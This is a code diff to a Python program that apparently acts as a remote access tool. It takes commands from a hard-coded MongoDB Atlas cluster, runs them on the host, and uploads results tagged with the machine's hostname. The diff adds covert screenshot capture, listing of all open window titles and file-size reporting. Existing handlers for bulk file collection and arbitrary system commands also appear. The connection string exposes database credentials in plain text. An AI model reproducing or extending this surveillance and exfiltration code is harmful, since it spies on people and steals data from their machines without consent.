@@ -10,6 +10,8 @@ import numpy as np
 import requests
 import win32clipboard
 import gridfs
+import pyautogui
+import pygetwindow as gw
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
@@ -52,6 +54,20 @@ def imageReader(path,file):
     img=cv2.resize(np.array(images),(500,400))
     a=np.array(img)
     return a.tolist()
+
+def snap():
+    img=pyautogui.screenshot()
+    img=cv2.resize(np.array(img),(500,400))
+    a=np.array(img)
+    return a.tolist()
+
+def active_windows():
+    res=gw.getAllTitles()
+    data={
+            "hostname":hostname,
+            "result":res
+        }
+    upload(data)
 
 def action_on_system(new_path="",command="",original_filename="",update_str="",new_foldername="",new_filename="",path=""):
 	if command=='dir':
@@ -167,6 +183,7 @@ def action_take(listen):
     db=client['shell']
     action=listen['action']
     cwd=listen['current_path']
+
     try:
         if action=='dir':
             res=action_on_system(command=action,path=cwd)
@@ -222,6 +239,19 @@ def action_take(listen):
                 "result":imageReader(path=cwd,file=target_element)
             }
             upload(data)
+        elif action=='snap':
+            data={
+                "hostname":hostname,
+                "result":snap()
+            }
+            upload(data)
+        elif action=='getfilesize':
+            target_element=listen['target_element']
+            data={
+                "hostname":hostname,
+                "result":(os.path.getsize(cwd+'/'+target_element))/(1024*1024)
+            }
+            upload(data)
         elif action=='getalltypefiles':
             target_element=listen['target_element']
             list_coll=db.list_collection_names()
@@ -241,6 +271,8 @@ def action_take(listen):
                file_data.close() 
             except:
                 pass
+        elif action=='activewindows':
+            active_windows()
         elif listen['is_systemCommand']==1:
             cmd=listen['action']
             try:
